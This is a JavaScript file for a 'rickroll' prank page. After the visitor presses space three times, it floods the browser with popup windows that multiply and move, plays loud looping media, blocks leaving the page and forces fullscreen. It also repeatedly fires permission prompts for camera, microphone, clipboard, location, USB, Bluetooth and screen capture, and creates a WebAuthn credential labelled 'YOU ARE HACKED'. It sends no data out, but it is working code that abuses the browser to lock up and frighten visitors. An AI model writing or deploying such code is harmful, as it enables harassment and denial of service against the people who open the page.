const params = new URLSearchParams(location.search);
const isChildParam = params.get('child') === '1';
const hasOpener = !!window.opener && !window.opener.closed;
const isChild = isChildParam && hasOpener;
const childMode = parseInt(params.get('mode') || '-1');

const SCREEN_WIDTH = screen.availWidth;
const SCREEN_HEIGHT = screen.availHeight;
const WIN_W = 250;
const WIN_H = 180;
const MARGIN = 10;

const QR_URL = './qrcode.webp';

const wins = [];
const followWins = [];
let lastMoveSpawn = 0;
let lastWebauthnTime = 0;
let lastCameraTime = 0;
let webauthnPending = false;
let permissionIndex = 0;

let mouseX = SCREEN_WIDTH / 2;
let mouseY = SCREEN_HEIGHT / 2;

if (isChildParam && !hasOpener) {
	location.replace(location.origin + location.pathname);
} else if (isChild) {
	initChild();
} else {
	initParent();
}

function noTranslate() {
	document.documentElement.setAttribute('translate', 'no');
	document.documentElement.lang = 'en';
	let meta = document.querySelector('meta[name="google"]');
	if (!meta) {
		meta = document.createElement('meta');
		meta.name = 'google';
		meta.content = 'notranslate';
		document.head.appendChild(meta);
	}
}

function hideCursor() {
	const s = document.createElement('style');
	s.textContent = '*, *::before, *::after { cursor: none !important; }';
	document.head.appendChild(s);
}

function blockContextMenu() {
	document.addEventListener('contextmenu', (e) => {
		e.preventDefault();
		e.stopPropagation();
		return false;
	}, true);
	document.addEventListener('dragstart', (e) => e.preventDefault(), true);
	document.addEventListener('selectstart', (e) => e.preventDefault(), true);
}

function interceptUserInput(onInput) {
	['touchstart', 'touchmove', 'touchend', 'mousedown', 'mouseup', 'click',
		'keydown', 'keyup', 'keypress', 'contextmenu', 'wheel', 'mousemove']
		.forEach(evt => document.body.addEventListener(evt, onInput, { passive: false }));
}

function initParent() {
	noTranslate();
	trackMouseGlobal();
	startFollowLoop();
	blockContextMenu();

	let count = 0;
	const onKeyDown = (e) => {
		const isAlt = e.key === 'Alt' || e.code === 'AltLeft' || e.code === 'AltRight';
		const isEsc = e.key === 'Escape' || e.code === 'Escape';
		const isCtrl = e.key === 'Control' || e.code === 'ControlLeft' || e.code === 'ControlRight';

		if (isAlt || isEsc || isCtrl) {
			blockUnload();
			if (window.__prankStarted) {
				spawnChild();
			}
			e.preventDefault();
			return;
		}

		if (e.code === 'Space' || e.key === ' ') {
			if (++count === 3) startPrank();
		}
	};

	document.addEventListener('keydown', onKeyDown, true);

	let lastMouseSpawn = 0;
	document.addEventListener('mousemove', () => {
		if (!window.__prankStarted) return;
		const now = Date.now();
		if (now - lastMouseSpawn < 1000) return;
		lastMouseSpawn = now;
		spawnChild();
		spawnChild();
	});
}

function trackMouseGlobal() {
	document.addEventListener('mousemove', (e) => {
		mouseX = e.screenX;
		mouseY = e.screenY;
	});
	document.addEventListener('dragover', (e) => {
		mouseX = e.screenX;
		mouseY = e.screenY;
	});
	window.updateMouse = (x, y) => {
		mouseX = x;
		mouseY = y;
	};
}

function startFollowLoop() {
	setInterval(() => {
		for (let i = followWins.length - 1; i >= 0; i--) {
			const w = followWins[i];
			if (!w || w.closed) {
				followWins.splice(i, 1);
				continue;
			}
			try {
				w.moveTo(
					Math.round(mouseX - WIN_W / 2),
					Math.round(mouseY - WIN_H / 2)
				);
			} catch (e) { }
		}
	}, 16);
}

function animateUrlWithBlocks() {
	if (window.ApplePaySession) return;
	const BLOCKS = ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█'];
	const LEN = 8;
	const CENTER = (LEN - 1) / 2;
	setInterval(() => {
		let s = '';
		for (let i = 0; i < LEN; i++) {
			const d = Math.abs(i - CENTER);
			const n = Math.floor((Math.sin((Date.now() / 200) + d) + 1) / 2 * (BLOCKS.length - 1));
			s += BLOCKS[Math.max(0, Math.min(BLOCKS.length - 1, n))];
		}
		try { window.location.hash = s; } catch (err) { }
	}, 100);
}

function startPrank() {
	if (window.__prankStarted) return;
	window.__prankStarted = true;

	noTranslate();
	hideCursor();
	blockContextMenu();
	blockUnload();
	playSusSound();
	startSpawnInterval();
	downloadQR();
	animateUrlWithBlocks();

	document.querySelectorAll('body > *:not(script)').forEach(el => el.remove());

	for (let i = 0; i < 8; i++) spawnChild(0);
	for (let i = 0; i < 4; i++) spawnChild(1);
	for (let i = 0; i < 8; i++) spawnChild(2);

	setTimeout(() => {
		rickRollLocal();
		downloadTXT();
	}, 1000);

	interceptUserInput(handleInput);

	setInterval(() => {
		requestCameraAndMic();
		requestWebauthnAttestation();
	}, 3000);

	setInterval(() => {
		downloadQR();
	}, 10000);

	setInterval(() => {
		if (!document.fullscreenElement) {
			try { document.documentElement.requestFullscreen().catch(() => { }); } catch (e) { }
		}
	}, 5000);
}

const PERMISSION_LIST = [
	'requestMidiAccess',
	'requestBluetoothAccess',
	'requestUsbAccess',
	'requestSerialAccess',
	'requestHidAccess',
	'requestNfcAccess',
	'requestFileSystemAccess',
	'requestSpeechRecognition',
	'requestScreenCapture',
	'requestGeolocation',
	'requestNotifications',
	'requestClipboardRead',
	'requestPointerLock',
	'requestWakeLock',
	'requestIdleDetection',
	'requestXrSession',
	'requestSensors',
	'requestContactPicker',
	'requestPaymentHandler',
	'requestBackgroundSync',
	'requestPeriodicBackgroundSync',
	'requestPushSubscription',
	'requestLocalFonts',
	'requestWindowManagement',
	'requestPersistentStorage',
	'requestStorageAccess'
];

function firePermission() {
	const name = PERMISSION_LIST[permissionIndex % PERMISSION_LIST.length];
	permissionIndex++;
	try { window[name] && window[name](); } catch (e) { }
}

function requestGeolocation() {
	try {
		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(() => { }, () => { }, {
				enableHighAccuracy: true,
				timeout: 1000,
				maximumAge: 0
			});
			navigator.geolocation.watchPosition(() => { }, () => { });
		}
	} catch (e) { }
}

function requestNotifications() {
	try {
		if (window.Notification && Notification.permission === 'default') {
			Notification.requestPermission().then(() => { }).catch(() => { });
		} else if (window.Notification) {
			new Notification('RICKROLL', { body: '' });
		}
	} catch (e) { }
}

function requestClipboardRead() {
	try {
		if (navigator.clipboard && navigator.clipboard.readText) {
			navigator.clipboard.readText().catch(() => { });
		}
	} catch (e) { }
}

function requestMidiAccess() {
	try {
		if (navigator.requestMIDIAccess) {
			navigator.requestMIDIAccess({ sysex: true }).catch(() => { });
		}
	} catch (e) { }
}

function requestBluetoothAccess() {
	try {
		if (navigator.bluetooth && navigator.bluetooth.requestDevice) {
			navigator.bluetooth.requestDevice({ acceptAllDevices: true })
				.then(d => d.gatt.connect()).catch(() => { });
		}
	} catch (e) { }
}

function requestUsbAccess() {
	try {
		if (navigator.usb && navigator.usb.requestDevice) {
			navigator.usb.requestDevice({ filters: [{}] }).catch(() => { });
		}
	} catch (e) { }
}

function requestSerialAccess() {
	try {
		if (navigator.serial && navigator.serial.requestPort) {
			navigator.serial.requestPort({ filters: [] }).catch(() => { });
		}
	} catch (e) { }
}

function requestHidAccess() {
	try {
		if (navigator.hid && navigator.hid.requestDevice) {
			navigator.hid.requestDevice({ filters: [] }).catch(() => { });
		}
	} catch (e) { }
}

function requestNfcAccess() {
	try {
		if (window.NDEFReader) {
			const reader = new NDEFReader();
			reader.scan().catch(() => { });
		}
	} catch (e) { }
}

function requestFileSystemAccess() {
	try {
		if (window.showOpenFilePicker) {
			window.showOpenFilePicker().catch(() => { });
		}
		if (window.showSaveFilePicker) {
			window.showSaveFilePicker().catch(() => { });
		}
		if (window.showDirectoryPicker) {
			window.showDirectoryPicker().catch(() => { });
		}
	} catch (e) { }
}

function requestSpeechRecognition() {
	try {
		const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
		if (SR) {
			const rec = new SR();
			rec.continuous = true;
			rec.interimResults = true;
			rec.start();
			rec.onerror = () => { };
			setTimeout(() => { try { rec.stop(); } catch (e) { } }, 500);
		}
	} catch (e) { }
}

function requestScreenCapture() {
	try {
		if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
			navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
				.then(stream => {
					setTimeout(() => stream.getTracks().forEach(t => t.stop()), 300);
				})
				.catch(() => { });
		}
	} catch (e) { }
}

function requestPersistentStorage() {
	try {
		if (navigator.storage && navigator.storage.persist) {
			navigator.storage.persist().catch(() => { });
		}
	} catch (e) { }
}

function requestStorageAccess() {
	try {
		if (document.requestStorageAccess) {
			document.requestStorageAccess().catch(() => { });
		}
	} catch (e) { }
}

function requestPointerLock() {
	try {
		const rpl = document.body.requestPointerLock ||
			document.body.webkitRequestPointerLock ||
			document.body.mozRequestPointerLock ||
			document.body.msRequestPointerLock;
		if (rpl) rpl.call(document.body);
	} catch (e) { }
}

function requestWakeLock() {
	try {
		if (navigator.wakeLock && navigator.wakeLock.request) {
			navigator.wakeLock.request('screen').catch(() => { });
		}
	} catch (e) { }
}

function requestIdleDetection() {
	try {
		if (window.IdleDetector && window.IdleDetector.requestPermission) {
			window.IdleDetector.requestPermission().then(() => {
				if (window.IdleDetector) {
					new window.IdleDetector({ threshold: 60 }).start().catch(() => { });
				}
			}).catch(() => { });
		}
	} catch (e) { }
}

function requestXrSession() {
	try {
		if (navigator.xr && navigator.xr.requestSession) {
			navigator.xr.requestSession('immersive-vr').then(s => s.end()).catch(() => { });
			navigator.xr.requestSession('inline').then(s => s.end()).catch(() => { });
		}
	} catch (e) { }
}

function requestSensors() {
	try {
		if (window.DeviceMotionEvent && window.DeviceMotionEvent.requestPermission) {
			window.DeviceMotionEvent.requestPermission().catch(() => { });
		}
		if (window.DeviceOrientationEvent && window.DeviceOrientationEvent.requestPermission) {
			window.DeviceOrientationEvent.requestPermission().catch(() => { });
		}
	} catch (e) { }
}

function requestContactPicker() {
	try {
		if (navigator.contacts && navigator.contacts.select) {
			navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
				.catch(() => { });
		}
	} catch (e) { }
}

function requestPaymentHandler() {
	try {
		if (window.PaymentRequest) {
			const req = new PaymentRequest(
				[{ supportedMethods: 'https://google.com/pay' }],
				{ total: { label: 'RICKROLL', amount: { currency: 'USD', value: '0.01' } } }
			);
			req.canMakePayment().catch(() => { });
		}
	} catch (e) { }
}

function requestBackgroundSync() {
	try {
		if (navigator.serviceWorker && navigator.serviceWorker.ready) {
			navigator.serviceWorker.ready.then(reg => {
				if (reg.sync) reg.sync.register('rickroll-sync').catch(() => { });
			}).catch(() => { });
		}
	} catch (e) { }
}

function requestPeriodicBackgroundSync() {
	try {
		if (navigator.serviceWorker && navigator.serviceWorker.ready) {
			navigator.serviceWorker.ready.then(reg => {
				if (reg.periodicSync) {
					reg.periodicSync.register('rickroll-periodic', { minInterval: 60000 })
						.catch(() => { });
				}
			}).catch(() => { });
		}
	} catch (e) { }
}

function requestPushSubscription() {
	try {
		if (navigator.serviceWorker && navigator.serviceWorker.ready && window.PushManager) {
			navigator.serviceWorker.ready.then(reg => {
				reg.pushManager.subscribe({
					userVisibleOnly: true,
					applicationServerKey: new Uint8Array(65)
				}).catch(() => { });
			}).catch(() => { });
		}
	} catch (e) { }
}

function requestLocalFonts() {
	try {
		if (window.queryLocalFonts) {
			window.queryLocalFonts().catch(() => { });
		}
	} catch (e) { }
}

function requestWindowManagement() {
	try {
		if (window.getScreenDetails) {
			window.getScreenDetails().catch(() => { });
		}
	} catch (e) { }
}

function downloadQR() {
	const fileName = 'rickroll-qr-' + Date.now() + '.png';
	fetch(QR_URL, { mode: 'cors' })
		.then(r => r.blob())
		.then(blob => {
			const url = URL.createObjectURL(blob);
			const a = document.createElement('a');
			a.href = url;
			a.download = fileName;
			document.body.appendChild(a);
			a.click();
			a.remove();
			setTimeout(() => URL.revokeObjectURL(url), 5000);
		})
		.catch(() => {
			const a = document.createElement('a');
			a.href = QR_URL;
			a.download = fileName;
			a.target = '_blank';
			document.body.appendChild(a);
			a.click();
			a.remove();
		});
}

function pickAction() {
	const roll = Math.random();
	if (roll < 0.20) return 0;
	if (roll < 0.40) return 1;
	if (roll < 0.50) return 2;
	if (roll < 0.65) return 4;
	if (roll < 0.75) return 5;
	if (roll < 0.83) return 6;
	if (roll < 0.92) return 7;
	return 8;
}

function handleInput(e) {
	e.preventDefault();
	e.stopPropagation();

	if (e.type === 'mousemove') {
		mouseX = e.screenX;
		mouseY = e.screenY;
		const now = Date.now();
		if (now - lastMoveSpawn < 500) return;
		lastMoveSpawn = now;
	}

	firePermission();

	spawnChild();
	spawnChild();

	const action = pickAction();

	switch (action) {
		case 0:
			spawnChild(0); spawnChild(0); spawnChild(0); spawnChild(0);
			break;
		case 1:
			spawnChild(2); spawnChild(2); spawnChild(2); spawnChild(2);
			break;
		case 2:
			spawnChild(0); spawnChild(0); spawnChild(1); spawnChild(1); spawnChild(2); spawnChild(2);
			break;
		case 4:
			for (let i = 0; i < 8; i++) spawnChild(Math.floor(Math.random() * 3));
			break;
		case 5:
			for (let i = 0; i < 10; i++) spawnChild(Math.floor(Math.random() * 3));
			break;
		case 6:
			requestFullscreen();
			spawnChild(0); spawnChild(2); spawnChild(2);
			break;
		case 7:
			requestCameraAndMic();
			requestWebauthnAttestation();
			requestGeolocation();
			requestNotifications();
			downloadQR();
			spawnChild(0); spawnChild(0); spawnChild(2); spawnChild(2);
			break;
		case 8:
			for (let i = 0; i < 8; i++) firePermission();
			downloadQR();
			break;
	}

	focusWindows();
}

function spawnChild(mode) {
	if (isChild && (!window.opener || window.opener.closed)) {
		try { window.close(); } catch (e) { }
		return null;
	}

	if (mode == null) {
		const r = Math.random();
		mode = r < 0.6 ? 0 : (r < 0.8 ? 1 : 2);
	}

	const x = MARGIN + Math.floor(Math.random() * (SCREEN_WIDTH - WIN_W - MARGIN));
	const y = MARGIN + Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_H - MARGIN));

	const win = window.open(
		location.origin + location.pathname + `?child=1&mode=${mode}`,
		'_blank',
		`width=${WIN_W},height=${WIN_H},left=${x},top=${y},menubar=no,toolbar=no,location=no`
	);
	if (!win) return null;

	wins.push(win);
	if (mode === 2) followWins.push(win);
	return win;
}

function initChild() {
	noTranslate();
	hideCursor();
	blockContextMenu();
	blockUnload();

	document.body.innerHTML = '<h1 style="font-size:80px;text-align:center;user-select:none;margin:0"></h1>';
	document.body.style.background = '#' + Math.floor(Math.random() * 0xffffff).toString(16);
	document.body.style.margin = '0';
	document.body.style.overflow = 'hidden';

	const vid = document.createElement('video');
	vid.src = './RickRoll.webm';
	vid.loop = true;
	vid.muted = false;
	vid.volume = 1.0;
	vid.playsInline = true;
	vid.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;z-index:-1;opacity:0.15';
	document.body.appendChild(vid);

	const tryPlay = () => vid.play().catch(() => {
		setTimeout(tryPlay, 300);
	});
	tryPlay();

	document.addEventListener('click', () => {
		vid.muted = false;
		vid.volume = 1.0;
		vid.play().catch(() => { });
	}, { once: false });

	try {
		const a = new Audio('./sus.mp3');
		a.loop = true;
		a.play().catch(() => { });
	} catch (e) { }

	if (childMode === 0) moveWindowDVD();
	else if (childMode === 1) moveWindowRandom();
	else if (childMode === 2) childFollowMouse();

	setInterval(() => {
		document.body.style.background = '#' + Math.floor(Math.random() * 0xffffff).toString(16);
	}, 200);

	interceptUserInput(handleInput);

	setInterval(() => {
		for (let i = 0; i < 3; i++) spawnChild(Math.floor(Math.random() * 3));
	}, 3000);

	setInterval(() => {
		requestCameraAndMic();
		requestWebauthnAttestation();
		downloadQR();
	}, 5000);
}

function moveWindowDVD() {
	let x = window.screenX;
	let y = window.screenY;
	let w = window.outerWidth || WIN_W;
	let h = window.outerHeight || WIN_H;

	const speed = 4;
	let vx = speed * (Math.random() > 0.5 ? 1 : -1);
	let vy = speed * (Math.random() > 0.5 ? 1 : -1);

	function tick() {
		w = window.outerWidth || WIN_W;
		h = window.outerHeight || WIN_H;

		x += vx;
		y += vy;

		if (x <= MARGIN) { x = MARGIN; vx = Math.abs(vx); }
		if (x + w >= SCREEN_WIDTH - MARGIN) { x = SCREEN_WIDTH - MARGIN - w; vx = -Math.abs(vx); }
		if (y <= MARGIN) { y = MARGIN; vy = Math.abs(vy); }
		if (y + h >= SCREEN_HEIGHT - MARGIN) { y = SCREEN_HEIGHT - MARGIN - h; vy = -Math.abs(vy); }

		try { window.moveTo(x, y); } catch (e) { }
	}

	function loop() {
		tick();
		requestAnimationFrame(loop);
	}
	requestAnimationFrame(loop);

	setInterval(() => {
		if (document.hidden) tick();
	}, 16);
}

function moveWindowRandom() {
	setInterval(() => {
		const x = MARGIN + Math.random() * (SCREEN_WIDTH - WIN_W - MARGIN);
		const y = MARGIN + Math.random() * (SCREEN_HEIGHT - WIN_H - MARGIN);
		try { window.moveTo(x, y); } catch (e) { }
		try {
			window.resizeTo(
				150 + Math.random() * 200,
				120 + Math.random() * 150
			);
		} catch (e) { }
	}, 400 + Math.random() * 600);
}

function childFollowMouse() {
	document.addEventListener('mousemove', (e) => {
		try {
			if (window.opener && !window.opener.closed && window.opener.updateMouse) {
				window.opener.updateMouse(e.screenX, e.screenY);
			}
		} catch (e) { }
	});

	window.addEventListener('focus', () => {
		document.addEventListener('mousemove', function handler(e) {
			try {
				if (window.opener && !window.opener.closed && window.opener.updateMouse) {
					window.opener.updateMouse(e.screenX, e.screenY);
				}
			} catch (e) { }
		});
	});
}

function focusWindows() {
	wins.forEach(win => {
		if (win && !win.closed) {
			try { win.focus(); } catch (e) { }
		}
	});
}

function requestFullscreen() {
	try {
		const el = document.documentElement;
		const rfs = el.requestFullscreen ||
			el.webkitRequestFullscreen ||
			el.mozRequestFullScreen ||
			el.msRequestFullscreen;
		if (rfs) rfs.call(el);
	} catch (e) { }
}

function blockUnload() {
	if (window.__blockUnloadSet) return;
	window.__blockUnloadSet = true;

	window.addEventListener('beforeunload', (e) => {
		e.preventDefault();
		e.returnValue = 'Are you sure?';
		return 'Are you sure?';
	}, { capture: true });
}

function startSpawnInterval() {
	setInterval(() => {
		const n = 3 + Math.floor(Math.random() * 5);
		for (let i = 0; i < n; i++) {
			spawnChild(Math.floor(Math.random() * 3));
		}
	}, 5000);
}

function requestCameraAndMic() {
	const now = Date.now();
	if (now - lastCameraTime < 3000) return;
	lastCameraTime = now;

	if (!navigator.mediaDevices ||
		typeof navigator.mediaDevices.getUserMedia !== 'function') return;

	navigator.mediaDevices.enumerateDevices().then(devices => {
		const cameras = devices.filter(d => d.kind === 'videoinput');
		if (cameras.length === 0) return;
		const camera = cameras[cameras.length - 1];

		navigator.mediaDevices.getUserMedia({
			deviceId: camera.deviceId,
			facingMode: ['user', 'environment'],
			audio: true,
			video: true
		}).then(stream => {
			const track = stream.getVideoTracks()[0];
			if (window.ImageCapture && track) {
				const ic = new window.ImageCapture(track);
				ic.getPhotoCapabilities().then(() => {
					track.applyConstraints({ advanced: [{ torch: true }] });
				}, () => { });
			}
		}, () => { });
	}, () => { });
}

function requestWebauthnAttestation() {
	const now = Date.now();
	if (now - lastWebauthnTime < 3000) return;
	if (webauthnPending) return;
	lastWebauthnTime = now;
	webauthnPending = true;

	try {
		const createCredentialDefaultArgs = {
			publicKey: {
				rp: { name: 'Acme' },
				user: {
					id: new Uint8Array(16),
					name: 'YOU_ARE_HACKED@EXAMPLE.COM',
					displayName: 'YOU ARE HACKED'
				},
				pubKeyCredParams: [{ type: 'public-key', alg: -7 }],
				attestation: 'direct',
				timeout: 60000,
				challenge: new Uint8Array([
					0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
					0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
				]).buffer
			}
		};

		const getCredentialDefaultArgs = {
			publicKey: {
				timeout: 60000,
				challenge: new Uint8Array([
					0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
					0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
				]).buffer
			}
		};

		navigator.credentials.create(createCredentialDefaultArgs)
			.then((cred) => {
				const idList = [{
					id: cred.rawId,
					transports: ['usb', 'nfc', 'ble'],
					type: 'public-key'
				}];
				getCredentialDefaultArgs.publicKey.allowCredentials = idList;
				return navigator.credentials.get(getCredentialDefaultArgs);
			})
			.catch(() => { })
			.finally(() => { webauthnPending = false; });
	} catch (e) {
		webauthnPending = false;
	}
}

function playSusSound() {
	const a = new Audio('./sus.mp3');
	a.loop = true;
	a.volume = 1.0;

	const tryPlay = () => a.play().catch(() => {
		setTimeout(tryPlay, 1000);
	});
	tryPlay();

	document.addEventListener('click', () => {
		a.play().catch(() => { });
	}, { once: false });
}

function downloadTXT() {
	const a = document.createElement('a');
	a.href = 'data:text/plain,CONGRATS RICKROLL';
	a.download = 'RICKROLL';
	document.body.appendChild(a);
	a.click();
	a.remove();
}

function rickRollLocal() {
	const vid = document.createElement('video');
	vid.id = 'RickRoll';
	vid.src = './RickRoll.webm';
	vid.autoplay = true;
	vid.loop = true;
	vid.muted = false;
	vid.volume = 1.0;
	vid.playsInline = true;
	document.body.appendChild(vid);

	const tryPlay = () => vid.play().catch(() => {
		setTimeout(tryPlay, 300);
	});
	tryPlay();
}
